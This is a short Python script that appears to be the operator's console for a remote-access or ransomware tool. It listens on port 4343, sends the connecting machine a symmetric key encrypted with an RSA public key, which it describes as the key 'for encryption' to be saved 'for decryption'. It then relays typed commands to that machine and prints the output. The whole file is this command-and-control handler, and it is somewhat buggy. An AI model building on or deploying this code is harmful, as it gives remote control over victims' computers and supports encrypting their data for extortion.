import socket
import threading
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import time
from Crypto.Random import get_random_bytes




def lisner(pk,key) :
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setblocking(1)
    sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    try:
        sock.bind(("192.168.109.130",4343))
        sock.listen(2)
        con, add = sock.accept()
    except Exception as e :
        time.sleep(1.5)
        lisner(pk, key)
    print("connection from {0}:{1}".format(add[0],add[1]))
    t = threading.Thread(args=(con,))
    pubkey = RSA.importKey(pk)
    c = PKCS1_OAEP.new(pubkey)
    en_key = c.encrypt(key.encode("utf-8"))
    con.send(en_key)
    print("your encrypted key is :",en_key)
    data = con.recv(1024)
    print(data.decode("utf-8"))
    s = input(">>")
    con.send(s.encode("utf-8"))
    while True :
        try :
                s = input(">>")
                con.send(s.encode("utf-8"))
                print(s)
                if s == "exit" :
                    print("connection closed")
                    con.close()
                    break   
                else: 
                    data = con.recv(1024)
                    print(data.decode("utf-8"))
                    data1 = con.recv(1024)
                    print(data1.decode("utf-8"))
                    if data.decode("utf-8") == "[+]going back" and data1.decode("utf-8") == "[+]going back completed successfully" :
                        data = con.recv(1024)
                        print(data.decode("utf-8"))
                        data1 = con.recv(1024)
                        print(data1.decode("utf-8"))
                        s = input(">>")
                        con.send(s.encode("utf-8"))
        except Exception as e :
                        continue


pub_key = "you public key genrate it please."
pub_key = pub_key.encode("utf-8")
key = input("==>please enter the symetrique key for encryption and saved it for decryption \n>>")
try:
      lisner(pub_key, key) 
except :
      lisner(pub_key, key)   
      
      
      

